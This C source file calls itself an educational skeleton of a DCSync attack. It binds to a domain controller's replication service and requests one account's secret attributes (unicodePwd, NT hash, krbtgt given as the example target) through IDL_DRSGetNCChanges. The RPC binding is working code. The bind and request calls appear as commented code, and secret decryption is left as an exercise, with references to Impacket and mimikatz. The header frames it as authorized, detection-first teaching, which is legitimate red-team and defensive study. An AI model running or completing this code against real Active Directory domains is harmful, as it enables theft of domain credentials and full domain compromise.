/*
 * dcsync.c  -  Educational DCSync skeleton (MS-DRSR / IDL_DRSGetNCChanges)
 *
 * Writeup: https://jperezduerto.info/techniques/dcsync-replication-abuse/
 *
 * WHAT THIS TEACHES
 *   DCSync is not malware on a domain controller. It is a normal domain
 *   controller operation performed by a caller that should not be making it:
 *   bind to a DC's Directory Replication Service (drsuapi) and ask it to
 *   replicate one account's secret attributes with IDL_DRSGetNCChanges, exactly
 *   as a replica DC would. This file shows that call flow in readable C.
 *   MITRE ATT&CK T1003.006.
 *
 * THIS IS A SKELETON ON PURPOSE
 *   The two hardest, most instructive parts are left for you to implement, so
 *   you learn the protocol instead of running someone else's tool:
 *     (1) the RPC client stubs, generated from the public MS-DRSR IDL with MIDL
 *         (see the README BUILD section); and
 *     (2) decrypting the returned secret attributes with the DRS session key.
 *   As written it demonstrates the bind and the request, and marks exactly
 *   where the secrets would be decrypted. Finishing those two steps is the
 *   exercise, and it is where the real understanding is.
 *
 * PRECONDITION
 *   A controlled principal that already holds BOTH replication rights on the
 *   domain object: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
 *   DCSync is what you do once you hold those rights. It is not a way to obtain
 *   them. If you do not hold them, the DC answers DRSGetNCChanges with an error.
 *
 * AUTHORIZED USE ONLY. Read the companion writeup first: it is detection-first,
 * because one correctly configured Event 4662 rule on your DCs catches this.
 */

#include <windows.h>
#include <rpc.h>
#include <stdio.h>

/*
 * The drsuapi interface is defined in MS-DRSR with UUID
 *   E3514235-4B06-11D1-AB04-00C04FC2DCD2  (version 4.0)
 * over ncacn_ip_tcp. The client functions you call,
 *   IDL_DRSBind()          -> returns a DRS handle (hDrs)
 *   IDL_DRSGetNCChanges()  -> the replication request that returns secrets
 *   IDL_DRSUnbind()
 * and every structure they use (DRS_MSG_GETCHGREQ_V8, DRS_MSG_GETCHGREPLY,
 * DSNAME, UUID, REPLENTINFLIST, ATTRVALBLOCK, ...) are produced by compiling
 * the MS-DRSR IDL with MIDL. We do NOT redefine them here; we reference the
 * generated header. Generating that header is step 1 of BUILD.
 */
#include "drsuapi_h.h"   /* <- MIDL output from ms-drsr.idl; see README */

/* EXOP for single-object replication: ask for exactly one account's data. */
#ifndef EXOP_REPL_OBJ
#define EXOP_REPL_OBJ 0x00000001
#endif

/* Build an authenticated, privacy-sealed RPC binding to the DC's drsuapi.
 * This part is real and self-contained; it is the handshake the DC logs. */
static RPC_BINDING_HANDLE bind_drsuapi(const wchar_t *dcHost)
{
    RPC_WSTR          stringBinding = NULL;
    RPC_BINDING_HANDLE binding      = NULL;
    RPC_STATUS         st;

    /* ncacn_ip_tcp, dynamic endpoint resolved via the endpoint mapper. */
    st = RpcStringBindingComposeW(
            NULL,                         /* let the EPM supply the UUID      */
            (RPC_WSTR)L"ncacn_ip_tcp",
            (RPC_WSTR)dcHost,
            NULL,                         /* dynamic endpoint                 */
            NULL,
            &stringBinding);
    if (st != RPC_S_OK) { printf("[!] compose: %ld\n", st); return NULL; }

    st = RpcBindingFromStringBindingW(stringBinding, &binding);
    RpcStringFreeW(&stringBinding);
    if (st != RPC_S_OK) { printf("[!] bind: %ld\n", st); return NULL; }

    /* Negotiate (Kerberos/NTLM) with packet privacy. The identity used here is
     * the controlled account that holds the replication rights. NULL = the
     * caller's current token; set an explicit SEC_WINNT_AUTH_IDENTITY to use
     * other recovered credentials. */
    st = RpcBindingSetAuthInfoW(
            binding,
            (RPC_WSTR)dcHost,             /* SPN target                       */
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_AUTHN_GSS_NEGOTIATE,
            NULL,
            RPC_C_AUTHZ_NONE);
    if (st != RPC_S_OK) { printf("[!] authinfo: %ld\n", st); return NULL; }

    return binding;
}

int wmain(int argc, wchar_t **argv)
{
    if (argc < 3) {
        wprintf(L"usage: dcsync.exe <dc-fqdn> <target-user-DN-or-sid>\n");
        wprintf(L"   e.g. dcsync.exe dc01.example.local "
                L"\"CN=krbtgt,CN=Users,DC=example,DC=local\"\n");
        return 2;
    }
    const wchar_t *dc     = argv[1];
    const wchar_t *target = argv[2];

    RPC_BINDING_HANDLE b = bind_drsuapi(dc);
    if (!b) return 3;
    wprintf(L"[+] bound to drsuapi on %s\n", dc);

    /*
     * STEP A: IDL_DRSBind -> hDrs
     * Pass the client DRS extensions blob (DRS_EXTENSIONS_INT) advertising the
     * caps you support, e.g. DRS_EXT_GETCHGREQ_V8. The generated stub prototype
     * is in drsuapi_h.h.
     *
     *   DRS_HANDLE hDrs = NULL;
     *   IDL_DRSBind(b, &NTDSAPI_CLIENT_GUID, &myExtsIn, &svrExtsOut, &hDrs);
     */

    /*
     * STEP B: build DRS_MSG_GETCHGREQ_V8 for a SINGLE object.
     *   - set ulExtendedOp = EXOP_REPL_OBJ   (replicate one object, not the NC)
     *   - set pNC (DSNAME) to <target>: the account whose secrets you want
     *   - request secret attributes in pPartialAttrSet (unicodePwd,
     *     ntPwdHistory, supplementalCredentials, ...)
     * Then call the replication request:
     *
     *   DRS_MSG_GETCHGREQ req = {0}; DWORD outVer = 0; DRS_MSG_GETCHGREPLY rep = {0};
     *   IDL_DRSGetNCChanges(hDrs, 8, &req, &outVer, &rep);
     */
    wprintf(L"[*] would request replication of: %s\n", target);

    /*
     * STEP C (EXERCISE): decrypt and print.
     * The reply carries the target's attributes in rep.V6.pObjects ->
     * AttrBlock -> ATTRVAL, with the secret attributes ENCRYPTED. They are
     * sealed with a key derived from the DRS session key (the RPC security
     * context) and the object RID. You must:
     *   1. pull the session key from the authenticated binding,
     *   2. run the MS-DRSR secret-decryption (RC4/DES + salt per the spec),
     *   3. map ATT_* OIDs to names and print the NT hash.
     * References to implement this correctly:
     *   - MS-DRSR sections 5.x (EncryptedPayload / secret decryption)
     *   - Impacket drsuapi.py (readable, canonical, open source)
     *   - mimikatz lsadump::dcsync (the original C implementation)
     * This skeleton intentionally stops here. Implementing STEP C yourself is
     * the point of the exercise.
     */
    wprintf(L"[i] decryption of returned secrets is left as an exercise; "
            L"see README and MS-DRSR 5.x\n");

    /* STEP D: IDL_DRSUnbind(&hDrs); and free RPC resources. */
    RpcBindingFree(&b);
    return 0;
}
